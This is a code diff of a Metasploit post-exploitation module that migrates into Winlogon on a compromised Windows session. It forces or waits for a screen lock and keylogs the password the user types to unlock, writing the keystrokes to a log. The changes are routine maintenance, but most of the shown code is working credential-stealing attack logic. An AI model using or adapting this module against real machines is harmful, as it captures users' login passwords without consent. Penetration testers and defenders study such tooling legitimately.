@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -25,9 +21,8 @@ class Metasploit3 < Msf::Post
 					Winlogon.exe. Using idle time and natural system changes to give a
 					false sense of security to the user.},
 			'License'      => MSF_LICENSE,
-			'Author'       => ['Rob Fuller <mubix[at]hak5.org>', 'cg'],
-			'Version'      => '$Revision$',
-			'Platform'     => ['windows'],
+			'Author'       => [ 'mubix', 'cg' ],
+			'Platform'     => ['win'],
 			'SessionTypes' => ['meterpreter'],
 			'References'   => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']]
 		))
@@ -117,7 +112,7 @@ class Metasploit3 < Msf::Post
 						outp << " <0x%.2x> " % vk
 					end
 				end
-				sleep(2)
+				select(nil,nil,nil,2)
 				file_local_write(logfile,"#{outp}\n")
 				if outp != nil and outp.chomp.lstrip != "" then
 					print_status("Password?: #{outp}")
@@ -138,11 +133,11 @@ class Metasploit3 < Msf::Post
 				else
 					print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
 				end
-				sleep(keytime.to_i)
+				select(nil,nil,nil,keytime.to_i)
 			end
 		rescue::Exception => e
 			if e.message != 'win'
-				print("\n")
+				print_line()
 				print_status("#{e.class} #{e}")
 			end
 			print_status("Stopping keystroke sniffer...")
@@ -153,7 +148,7 @@ class Metasploit3 < Msf::Post
 
 	def run
 		# Log file variables
-		host,port = session.tunnel_peer.split(':')								# Get hostname
+		host,port = session.session_host, session.session_port
 		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")					# Create Filename info to be appended to downloaded files
 		logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')		# Create a directory for the logs
 		::FileUtils.mkdir_p(logs)											# Create the log directory
@@ -174,14 +169,14 @@ class Metasploit3 < Msf::Post
 		end
 
 		mypid = session.sys.process.getpid
-		if datastore['pid'] == 0
+		if datastore['PID'] == 0
 			targetpid = get_winlogon
 			if targetpid == 'exit'
 				return
 			end
 			print_status("Found WINLOGON at PID:#{targetpid}")
 		else
-			targetpid = datastore['pid']
+			targetpid = datastore['PID']
 			print_status("WINLOGON PID:#{targetpid} specified. I'm trusting you...")
 		end
 
@@ -210,7 +205,7 @@ class Metasploit3 < Msf::Post
 
 		print_good("Keylogging for #{client.info}")
 		file_local_write(logfile,"#{client.info}\n")
-		if datastore['wait'] then
+		if datastore['WAIT'] then
 			print_status("Waiting for user to lock out their session")
 			locked = false
 			while locked == false
@@ -219,15 +214,15 @@ class Metasploit3 < Msf::Post
 					print_status("Session has been locked out")
 				else
 					# sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this
-					sleep(2)
+					select(nil,nil,nil, 2)
 				end
 			end
 		else
 			currentidle = session.ui.idle_time
 			print_status("System has currently been idle for #{currentidle} seconds")
-			while currentidle <= datastore['locktime'] do
+			while currentidle <= datastore['LOCKTIME'] do
 				print_status("Current Idle time: #{currentidle} seconds")
-				sleep(datastore['heartbeat'])
+				select(nil,nil,nil,datastore['HEARTBEAT'])
 				currentidle = session.ui.idle_time
 			end
 			client.railgun.user32.LockWorkStation()
@@ -244,7 +239,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		if startkeylogger(session)
-			keycap(session, datastore['interval'], logfile)
+			keycap(session, datastore['INTERVAL'], logfile)
 		end
 	end
 end
